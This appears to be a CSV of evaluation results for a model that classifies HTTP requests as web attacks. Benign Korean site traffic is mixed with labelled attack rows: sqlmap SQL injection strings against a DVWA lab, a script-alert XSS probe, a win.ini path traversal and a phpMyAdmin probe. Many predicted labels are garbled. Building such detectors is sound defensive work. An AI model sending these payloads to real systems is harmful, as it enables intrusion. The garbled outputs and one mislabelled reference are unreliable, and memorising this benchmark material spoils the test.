payload,reference_text,candidate_text,bleu_score
"GET / home / kor / promotionData / compatriot / compatriotLove / application. do? menuPos = 114 & idx = & act = aplication & searchValue1 = 0 & searchKeyword = & pageIndex = 1 HTTP / 1. 1 Host : www. koreahana. or. kr Connection : keep - alive sec - ch - ua : "" Not A ; Brand "" ; v = "" 99 "", "" Chromium "" ; v = "" 99 "", "" Google Chrome "" ; v = "" 99 "" sec - ch - ua - mobile :? 0 sec - ch - ua - platform : "" Windows "" Upgrade - Insecure - Requests : 1 User - Agent : Mozilla / 5. 0 ( Windows NT 6. 1 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 99. 0. 4844. 51 Safari / 537. 36 Accept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, image / avif, image / webp, image / apng, * / * ; q = 0. 8, application / signed - exchange ; v = b3 ; q = 0. 9 Sec - Fetch - Site : same - origin Sec - Fetch - Mode : navigate Sec - Fetch - User :? 1 Sec - Fetch - Dest : document Referer : https : / / www. koreahana. or. kr / home / kor / promotionData / compatriot / compatriotLove / index. do? menuPos = 114 Accept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7 Cookie : _ ga = GA1. 1. 174699203. 1676337810 ; JSESSIONID = DEC5E66C8B39CC0A6396A1750D4D6C77 ; _ ga _ REGF3YSVK0 = GS1. 1. 1678067198. 2. 1. 1678067232. 0. 0. 0",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / mail / common / dynatree / ui. dynatree. css HTTP / 1. 1 Accept : * / * Referer : http : / / 10. 1. 1. 250 : 8081 / mail / 0000 / index. jsp? lang = ko Accept - Language : ko - KR User - Agent : Mozilla / 4. 0 ( compatible ; MSIE 7. 0 ; Windows NT 10. 0 ; WOW64 ; Trident / 7. 0 ;. NET4. 0C ;. NET4. 0E ;. NET CLR 2. 0. 50727 ;. NET CLR 3. 0. 30729 ;. NET CLR 3. 5. 30729 ) Accept - Encoding : gzip, deflate Host : 10. 1. 1. 250 : 8081 Connection : Keep - Alive Cookie : JSESSIONID = raejot6bucmbc4hycsllrdon",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / openurl? sid = EBSCO : edsker & genre = dissertation & issn = edsker & ISBN = & volume = & issue = & date = 20200717 & spage = & pages = & title = : / PEST ANALYSIS OF REGION AND SUCCESS FACTORS OF FESTIVALS : FOCUSED ON GWANG - JU NAMHANSANSUNG CULTURAL FESTIVAL & atitle = : / PEST ANALYSIS OF REGION AND SUCCESS FACTORS OF FESTIVALS : FOCUSED ON GWANG - JU NAMHANSANSUNG CULTURAL FESTIVAL & aulast = & id = DOI : HTTP / 1. 1 \ nHost : resolver. ebscohost. com \ nConnection : keep - alive \ nUpgrade - Insecure - Requests : 1 \ nUser - Agent : Mozilla / 5. 0 ( Macintosh ; Intel Mac OS X 10 _ 15 _ 7 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 88. 0. 4324. 150 Safari / 537. 36 \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, image / avif, image / webp, image / apng, * / * ; q = 0. 8, application / signed - exchange ; v = b3 ; q = 0. 9 \ nReferer : http : / / libproxy. karts. ac. kr / \ nAccept - Encoding : gzip, deflate \ nAccept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7 \ nCookie : ssotoken = Vy23zFyENGIN",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = - 1853'/ * * / OR / * * / ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 2100 = 7468 ) / * * / THEN / * * / NULL / * * / ELSE / * * / CTXSYS. DRITHSX. SN ( 1, 2100 ) / * * / END ) / * * / FROM / * * / DUAL ) / * * / IS / * * / NULL / * * / AND / * * /'KPGy'/ * * / LIKE / * * /'KPGy sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) security = impossible ;,","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = - 1853'/ * * / OR / * * / ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 2100 = 7468 ) / * * / THEN / * * / NULL / * * / ELSE / * * / CTXSYS. DRITHSX. SN ( 1, 2100 ) / * * / END ) / * * / FROM / * * / DUAL ) / * * / IS / * * / NULL / * * / AND / * * /'KPGy'/ * * / LIKE / * * /'KPGy Attack Type : SQL Injection","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = - % ' / * * / OR / * * / ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 3998 = 3998 ) / * * / THEN / * * / NULL / * * / ELSE / * * / CTXSYS . DRITHSX . SN ( 1 , 3998 ) / * * / END ) / * * / FROM / * * / DUAL ) / * * / IS / * * / NULL / * * / AND / * * / ' ' ' / * * / LIKE / * * / ' Attack Attack Type : SQL Injection",0.7376625712398684
"GET / resources / 20230410155838 / np / js / modules / common / utils / browserChecker. js HTTP / 1. 1 Host : www. coupang. com Connection : keep - alive sec - ch - ua : "" Whale "" ; v = "" 3 "", "" Not - A. Brand "" ; v = "" 8 "", "" Chromium "" ; v = "" 112 "" sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 112. 0. 0. 0 Whale / 3. 20. 182. 9 Safari / 537. 36 sec - ch - ua - platform : "" Windows "" Accept : * / * Sec - Fetch - Site : same - origin Sec - Fetch - Mode : no - cors Sec - Fetch - Dest : script Referer : https : / / www. coupang. com / vp / products / 6973599821? itemId = 17015889469 & vendorItemId = 84191595902 & src = 1139000 & spec = 10799999 & addtag = 400 & ctag = 6973599821 & lptag = AF9073541 & itime = 20230411155022 & pageType = PRODUCT & pageValue = 6973599821 & wPcid = 16793499553013966762173 & wRef = camecame. dynamic - dns. net & wTime = 20230411155022 & redirect = landing & traceid = V0 - 181 - edbd8489c776f & mcid = 0fcc724e97a04a5da508589a7fb25923 & placementid = & clickBeacon = & campaignid = & contentcategory = & imgsize = & pageid = & deviceid = & token = & contenttype = & subid = & impressionid = & campaigntype = & requestid = & contentkeyword = & subparam = & isAddedCart = Accept - Encoding : gzip, deflate, br Accept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7 Cookie : PCID = 1679349955",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"( SELECT / * * / ( CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 106 ) | | CHR ( 106 ) | | CHR ( 113 ) ) | | ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 3531 = 3531 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0 / * * / END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 107 ) | | CHR ( 120 ) | | CHR ( 98 ) | | CHR ( 113 ) ) ) / dvwa / instructions. php? doc = 1 sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) PHPSESSID = jlpd56fppfes3q8njmedlrscgq ; security = impossible,",Label : 1 Attack Syntax : ( SELECT / * * / ( CHR ( 113 ) | | CHR ( 122 ) | | CHR ( 106 ) | | CHR ( 106 ) | | CHR ( 113 ) ) | | ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 3531 = 3531 ) / * * / THEN / * * / 1 / * * / ELSE / * * / 0 / * * / END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 107 ) | | CHR ( 120 ) | | CHR ( 98 ) | | CHR ( 113 ) ) ) Attack Type : SQL Injection,Label : 1 Attack Syntax ( ( ( ) ( ( ( ( ( ( ( ( | | | ( ( ( | | | | ( ( | | | | ( ( | | | | | ) ) | | | * * * | | ( * / * * * WHEN * * * / ( | ) | ) ) | * | | | | | ) | | | | | | | | | | CHR CHR CHR CHR | ) ) ) ) | | | | ) | | ) ) | ),0.1485691481358415
"HTTP / 1. 1 200 OK P3P : policyref = "" https : / / googleads. g. doubleclick. net / pagead / gcn _ p3p _. xml "", CP = "" CURa ADMa DEVa TAIo PSAo PSDo OUR IND UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR "" Timing - Allow - Origin : * Cross - Origin - Resource - Policy : cross - origin Date : Wed, 03 May 2023 23 : 57 : 20 GMT Pragma : no - cache Expires : Fri, 01 Jan 1990 00 : 00 : 00 GMT Cache - Control : no - cache, must - revalidate Content - Type : text / javascript ; charset = UTF - 8 X - Content - Type - Options : nosniff Content - Disposition : attachment ; filename = "" f. txt "" Content - Encoding : br Server : cafe Content - Length : 1270 X - XSS - Protection : 0 Set - Cookie : test _ cookie = CheckForPermission ; expires = Thu, 04 - May - 2023 00 : 12 : 20 GMT ; path = / ; domain =. doubleclick. net ; Secure ; SameSite = none Alt - Svc : h3 = "" : 443 "" ; ma = 2592000, h3 - 29 = "" : 443 "" ; ma = 2592000....... /. E. j....... v. po... 7.!. G..... (.. E. Ce.. %. X. o.?.. Y... z. c0 ]. - b < x4... {... FM. -. 7. D.. #.. EZ. o _. C.. J. c. Y.. I.,........ A ^'a.. civ. ^.. MM.. t $ e.... 5.,....... {.. wO | 6.. - > |.... j.. 0. | G. z. P }... <.... { i.. r? r....",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / research / AjaxArtInfoNewsList. do? & aiInfoCd ='03'& pageIndex = & searchText = & searchYear =.. \.. \.. \.. \.. \.. \.. \.. \ windows \ win. ini HTTP / 1. 1 \ r \ nReferer : http : / / www. mmca. go. kr / \ r \ nCookie : JSESSIONID = 6oaryRcz9daWK6xfosxLF1r8xsSm03aTX0Ku4WVFlIU91uWFJbZGd0OoXbAUSmTo. mocaweb _ servlet _ engine7 ; CID = null \ r \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ r \ nAccept - Encoding : gzip, deflate \ r \ nHost : www. mmca. go. kr \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 73. 0. 3683. 103 Safari / 537. 36 \ r \ nConnection : Keep - alive",Label : 1 Attack Syntax :.. \.. \.. \.. \.. \.. \.. \.. \.. \ windows \ win. ini Attack Type : Path Traversal,Label : 1 Attack Syntax : . . \ . \ \ . . \ . . \ . . \ . \ \ . . \ . . \ \ \ \ \ \ ini Attack Type : :,0.1514844366920973
"/ UNI / getMailList. do HTTP / 1. 1 Origin : http : / / ep. mou. go. kr Referer : http : / / ep. mou. go. kr / UNI / main / mainFrame. do Accept : application / json, text / javascript, * / * ; q = 0. 01 Accept - Language : ko X - Requested - With : XMLHttpRequest Accept - Encoding : gzip, deflate User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 70. 0. 3538. 102 Safari / 537. 36 Edge / 18. 18362 Host : ep. mou. go. kr Content - Length : 0 Connection : Keep - Alive Cache - Control : no - cache Cookie : JSESSIONID = yQPGvZWPv8tACnrufgyRzfkz. node01 - ha ; S00025486 = N ; SCOUTER = z4g47hkpri55cu",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / InsightTrk / tracker. do? pfno = 1157 & uuid = b8fc3b0e0b1fa152f24bcf044a6f4fc7 _ 41918 & sid = df9ab405a5a9b0a6b75dcf044a6f4fc7 _ 41918 & guuid = b8fc3b0e0b1fa152f24bcf044a6f4fc7 _ 41918 & expired = 1617843718 & dr = & XDR = & dt = Korean Culture and Information Service & du = http : / / www. kocis. go. kr / eng / openHistory. do & js = Y & sr = 1920x1080 & scd = 24 & je = N & tz = - 4 & tye = 2021 & tmo = 4 & tda = 7 & tho = 20 & tmi = 31 & tse = 58 & lng = en - us & os = MacIntel & cpu = & vr = 5. 0 ( Macintosh ; Intel Mac OS X 10 _ 15 _ 6 ) AppleWebKit / 605. 1. 15 ( KHTML, like Gecko ) Version / 14. 0. 3 Safari / 605. 1. 15 & ck = Y & brsz = 1920x1000 & isnw = Y HTTP / 1. 1 \ r \ nHost : logger. kcisa. kr \ r \ nConnection : keep - alive \ r \ nAccept : image / webp, image / png, image / svg + xml, image / * ; q = 0. 8, video / * ; q = 0. 8, * / * ; q = 0. 5 \ r \ nUser - Agent : Mozilla / 5. 0 ( Macintosh ; Intel Mac OS X 10 _ 15 _ 6 ) AppleWebKit / 605. 1. 15 ( KHTML, like Gecko ) Version / 14. 0. 3 Safari / 605. 1. 15 \ r \ nAccept - Language : en - us \ r \ nReferer : http : / / www. kocis. go. kr / \ r \ nAccept - Encoding : gzip, deflate",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 "" ) ) ) / * * / AND / * * / 1766 = ( SELECT / * * / COUNT ( * ) / * * / FROM / * * / SYSIBM. SYSTABLES / * * / AS / * * / T1, SYSIBM. SYSTABLES / * * / AS / * * / T2, SYSIBM. SYSTABLES / * * / AS / * * / T3 ) / * * / AND / * * / ( ( ( "" QdpM "" = "" QdpM sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) security = impossible ; PHPSESSID = spl3sgi4295st4ou1lsu39ufor,","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 "" ) ) ) / * * / AND / * * / 1766 = ( SELECT / * * / COUNT ( * ) / * * / FROM / * * / SYSIBM. SYSTABLES / * * / AS / * * / T1, SYSIBM. SYSTABLES / * * / AS / * * / T2, SYSIBM. SYSTABLES / * * / AS / * * / T3 ) / * * / AND / * * / ( ( ( "" QdpM "" = "" QdpM Attack Type : SQL Injection","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = 1 "" ) ) ) / * * / AND / * * / 3230 = ( SELECT / * * / COUNT ( * ) / * * / FROM / * * / SYSIBM . SYSTABLES / * * / AS / * * / T1 , SYSIBM . SYSTABLES / * * / AS / * * / T2 , SYSIBM . SYSTABLES / * * / AS / * * / T3 ) / * * / AND / * * / / ( ( "" "" "" = "" Attack Attack Type : SQL Injection",0.7421529869710535
"POST / main / product / product. asp txt = < script > alert ( 569 ) < / script > 200 Mozilla / 5. 0 + ( Windows + NT + 6. 1 ; + WOW64 ; + Trident / 7. 0 ; + rv : 11. 0 ) + like + Gecko,",Label : 1 Attack Syntax : < script > alert ( 569 ) < / script > Attack Type : Cross - Site Scripting ( XSS ),Label : 1 Attack Syntax : < script > alert ( alert ) < / script > Attack Type : Cross - Site Scripting ( XSS ),0.8985396083419646
"GET / oauth / authorize? fromSVC = ticket & origin = https : / / ticket. interpark. com / Gate / TPLoginConfirmGate. asp? GroupCode = & Tiki = & Point = & PlayDate = & PlaySeq = & HeartYN = & TikiAutoPop = & BookingBizCode = & MemBizCD = WEBBR & CPage = B & GPage = http % 3A % 2F % 2Fticket % 2Einterpark % 2Ecom % 2F & bizId = 50 & postProc = IFRAME & response _ type = code & client _ id = ticket - pc & redirect _ uri = http : / / accounts. interpark. com / oauth / callback & scope = openid & state = D51Vi _ - Ul2HR9NE93ygl2lmaKTKGT3NBEmfo _ YLySL0 HTTP / 1. 1 Host : accounts. interpark. com Connection : keep - alive Upgrade - Insecure - Requests : 1 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 102. 0. 0. 0 Safari / 537. 36 Accept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, image / avif, image / webp, image / apng, * / * ; q = 0. 8, application / signed - exchange ; v = b3 ; q = 0. 9 Referer : http : / / ticket. interpark. com / Accept - Encoding : gzip, deflate Accept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7 Cookie : pcid = 165537684497401344 ; OAX = 0y5JgWKrDB8ABG0I ; _ _ l _ p _ prc = IFRAME ; _ _ t _ a _ u = L2F1dGhvcml6ZS90aWNrZXQtcGM _",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"/ UNI / board210 / getBbsNotiPopupList. do? format = json HTTP / 1. 1 Origin : http : / / ep. mou. go. kr Referer : http : / / ep. mou. go. kr / UNI / main / mainFrame. do Accept : application / json, text / javascript, * / * ; q = 0. 01 Accept - Language : ko Content - Type : application / x - www - form - urlencoded ; charset = UTF - 8 X - Requested - With : XMLHttpRequest Accept - Encoding : gzip, deflate User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 70. 0. 3538. 102 Safari / 537. 36 Edge / 18. 18362 Host : ep. mou. go. kr Content - Length : 8 Connection : Keep - Alive Cache - Control : no - cache Cookie : JSESSIONID = LTwYF + mmxm1Uuhk26w + G2pG9. node02 - ha ; SCOUTER = x4hc0rdtt2en3p ; GPKISecureWebSession = HG8G9yT5mltVHmGYQ5pj",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 %'; DECLARE / * * / @ lMxt / * * / NVARCHAR ( 4000 ) ; SET / * * / @ lMxt = ( SELECT / * * /'qzjjq'+ ( SELECT / * * / ( CASE / * * / WHEN / * * / ( 9188 = 9188 ) / * * / THEN / * * /'1'/ * * / ELSE / * * /'0'/ * * / END ) ) +'qkxbq') ; EXEC / * * / @ lMxt - - sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) PHPSESSID = jlpd56fppfes3q8njmedlrscgq ; security = impossible,",Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1 %'; DECLARE / * * / @ lMxt / * * / NVARCHAR ( 4000 ) ; SET / * * / @ lMxt = ( SELECT / * * /'qzjjq'+ ( SELECT / * * % ( CASE / * * ( 9188 = 9188 ) / * * / THEN / * * /'1'/ * * / ELSE / * * /'0'/ * * / END ) ) ) +'qkxbq'; EXEC / * * / @ lMxt - - sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) PHPSESSID = jlpd56fppfes3q8njmedlrscgq ; security = impossible Attack Type : SQL Injection,Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = 1 ' ' ; DECLARE / * * / @ SELECT / * * / NVARCHAR ( 4000 ) ; SELECT / * * / ( ' = ( SELECT / * / / ' ' ' ) ( SELECT / * * / ( CASE / * * / WHEN / * * / * * = / ) / * * / THEN / * * / ' / ' ' * * / / * * / ' 0 ' / * / ' ' ' ' ; / * ' - sqlmap / 1 . 5 . 40 dev :,0.46386826789389135
"GET / sparql? output = json & format = json & timeout = 0 & query = SELECT DISTINCT * WHERE { < http : / / data. visitkorea. or. kr / resource / CATEGORY : 320102 >? property? object } ORDER BY? property & callback = lodlive HTTP / 1. 1Host : data. visitkorea. or. krAccept - Language : en - USCookie : JSESSIONID = 867BDE9A1E03E48067AF3BA2FE6E65BB. routerReferer : http : / / data. visitkorea. or. kr / lodlive? http : / / data. visitkorea. or. kr / resource / CATEGORY : 320102Connection : keep - aliveAccept : * / * From : googlebot ( at ) googlebot. comUser - Agent : Mozilla / 5. 0 ( Linux ; Android 6. 0. 1 ; Nexus 5X Build / MMB29P ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 98. 0. 4758. 102 Mobile Safari / 537. 36 ( compatible ; Googlebot / 2. 1 ; + http : / / www. google. com / bot. html ) Accept - Encoding : gzip, deflate, br",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"display : none "" class = "" margin - left - xxs "" src = "".. / assets / img / loading - spin. gif "" alt = "" Loading.. "" id = "" loadingSpin3 "" / > < / div > < div class = "" margin - bottom - xs text - center "" > < a class = "" btn btn - block btn - link wcag btn - lg "" id = "" cookieConsentDeclineLink4 "" href = "" # "" > < span id = "" declineAndFinish5 "" > < / span > < / a > < img style = "" display : none "" class = "" margin - left - xxs "" src = "".. / assets / img / loading - spin. gif "" alt = "" Loading.. "" id = "" loadingSpin26 "" / > < / div > < / form > < / div > < / div > < / div > < / div > < / div > < / div > < footer id = "" footer "" class = "" cortex - footer "" > < hr > < div class = "" container container - secondary "" > < div class = "" row "" > < div class = "" col - xs - 12 col - sm - 10 col - sm - push - 2 col - md - 11 col - md - push - 1 "" > < div class = "" row fixed - padding "" > < ul class = "" list - inline "" > < li > < a target = "" _ blank "" href = "" https : / / cdn. ipsosinteractive. com / deploy / i - say / ppamp / ko - kr. html "" > < span > Privacy Policy < / span > < / a > < / li > < / ul > < / div > < div class = "" row fixed - padding "" > < / div > < / div > < div class = "" col - xs - 12 col - sm - 2 col - sm - pull - 10 col - md - 1 col - md - pull - 11 text - center "" > < / div > < / div > < / div > < / footer > < img id = "" ajaxLoadingImage "" src = "" / / entercdn",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / phpMyAdmin - 2. 5. 7 - pl1 / HTTP / 1. 1 Host : 210. 113. 47. 113 Accept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 Accept - Encoding : deflate, gzip, identity Accept - Language : en - US ; q = 0. 6, en ; q = 0. 4 Referer : http : / / 210. 113. 47. 113 / User - Agent : Mozilla / 5. 0 ( Windows NT 5. 1 ; rv : 9. 0. 1 ) Gecko / 20100101 Firefox / 9. 0. 1",Label : 1 Attack Syntax : / phpMyAdmin - 2. 5. 7 - pl1 / Attack Type : Path Traversal,Label : 1 Attack Syntax : / phpMyAdmin - - . . . . / rc1 Attack Attack Type : Path Traversal,0.5438653754915955
"GET / toros / query / mediadaum / soonsal _ v2? body = { "" itemid "" : "" 20230609170758716 "", "" category "" : "" news "" } HTTP / 1. 1 Host : hades - proxy. v. daum. net Connection : keep - alive sec - ch - ua : "" Not. A / Brand "" ; v = "" 8 "", "" Chromium "" ; v = "" 114 "", "" Microsoft Edge "" ; v = "" 114 "" Accept : application / json, text / plain, * / * sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 114. 0. 0. 0 Safari / 537. 36 Edg / 114. 0. 1823. 41 sec - ch - ua - platform : "" Windows "" Origin : https : / / v. daum. net Sec - Fetch - Site : same - site Sec - Fetch - Mode : cors Sec - Fetch - Dest : empty Referer : https : / / v. daum. net / v / 20230609170758716 Accept - Encoding : gzip, deflate, br Accept - Language : ko, en ; q = 0. 9, en - US ; q = 0. 8 Cookie : webid = b35c7c51098f4bff9795298b66a36774 ; webid _ ts = 1664849406065 ; _ _ gsas = ID = e039eff3ece6b433 : T = 1686207790 : RT = 1686207790 : S = ALNI _ MZmrlMuAlkruUJauL97bzM9Tm9VqQ ; webid _ sync = 1686298356977 ; _ T _ ANO = AB + dLHhBSaTUdTdG89CtiSp3JTulXNGFCAUOsW35vnBG / T8X9qm0MaEm66bVFw / xdV2kTF8vToDcF6mJLo3qXzfevAMbJlyipCvDvz62ioIWJM5TJgedsup5caTM2 + iAggGQsLTBuv / 9gtevYv0aXv",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / pixel? google _ nid = turn1 & google _ cm & google _ sc & google _ hm = MzcxOTg1MjEyNTUxMzc4MjE2OQ = = & gdpr = & gdpr _ consent = HTTP / 1. 1 Host : cm. g. doubleclick. net Connection : keep - alive sec - ch - ua : "" Not. A / Brand "" ; v = "" 8 "", "" Chromium "" ; v = "" 114 "", "" Google Chrome "" ; v = "" 114 "" sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 114. 0. 0. 0 Safari / 537. 36 sec - ch - ua - platform : "" Windows "" Accept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 Sec - Fetch - Site : cross - site Sec - Fetch - Mode : no - cors Sec - Fetch - Dest : image Referer : https : / / pagead2. googlesyndication. com / Accept - Encoding : gzip, deflate, br Accept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7 Cookie : IDE = AHWqTUlHL - m - N - E5I5Y _ DOj5v5oXi5N9bLBc75ghOpds8QeY313mrp4GYVjZKSVz - cY ; DSID = NO _ DATA",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / oceangrid / cmm / proxyRun. do? call = wms & LAYERS = geotwo _ postgis : og _ stat _ ps _ so & CQL _ FILTER = obs _ year > = 2020 AND obs _ year < = 2020 AND obs _ type ='S'& SERVICE = WMS & REQUEST = GetMap & FORMAT = image / png & VERSION = 1. 3. 0 & EXCEPTIONS = text / xml & TRANSPARENT = TRUE & STYLES = & CRS = EPSG : 900913 & BBOX = 13652751. 779521, 4028341. 9199358, 14364227. 638701, 4297706. 0075752 & WIDTH = 2327 & HEIGHT = 881 HTTP / 1. 1 Host : www. khoa. go. kr Connection : keep - alive User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 103. 0. 0. 0 Safari / 537. 36 Accept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 Referer : http : / / www. khoa. go. kr / oceangrid / gis / category / observe / observeSearch. do? type = EYS Accept - Encoding : gzip, deflate Accept - Language : en - US, en ; q = 0. 9 Cookie : JSESSIONID = csIu32q4DatxE5Py73FAW1dTeBcChoB0FDMWd1Lr2TIfmn6E751zCxz78u1CAZ6F. UEtIT0Evb2NlYW5ncmlkMjE = ; WMONID = ZfDmM7AC0Za ; PCID = 7a4294bc - 17bd - f166 - e140 - 0f2821d77fa1 - 1645063440773 ; SCOUTER = zi1dj21dia5rv ; _ ga = GA1. 3. 498018437. 1645752888 ; _ fbp = fb. 2. 1645752888214. 273443204 ; openApiKeyExpirePopup999999 = true ; JSESSIONID =",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"http : / / - ip - / dvwa / vulnerabilities / fi /? page = include. php / dvwa / vulnerabilities / view _ source. php? id = fi & security = impossible & % 3E % 27 % 22 % 3E % 3Cscript % 3Ealert % 281348 % 29 % 3C % 2Fscript % 3E = 123 Mozilla / 5. 0 ( Windows NT 6. 1 ; WOW64 ; Trident / 7. 0 ; rv : 11. 0 ) like Gecko security = impossible ; PHPSESSID = bv53361rm8kfr5272v9bu9cicj,",Label : 1 Attack Syntax : http : / / - ip - / dvwa / vulnerabilities / fi /? page = include. php / dvwa / vulnerabilities / view _ source. php? id = fi & security = impossible & % 3E % 27 % 22 % 3E % 3Cscript % 3Ealert % 281348 % 29 % 3C % 2Fscript % 3E = 123 Attack Type : SQL Injection,Label : 1 Attack Syntax : % 3E % 27 % 22 % 3E % 3Cscript % 3Ealert 3Ealert % % % % include % 2Fscript % 3E % % % % % 3C 3C % % XSS % % % % % % %,0.24504418146095774
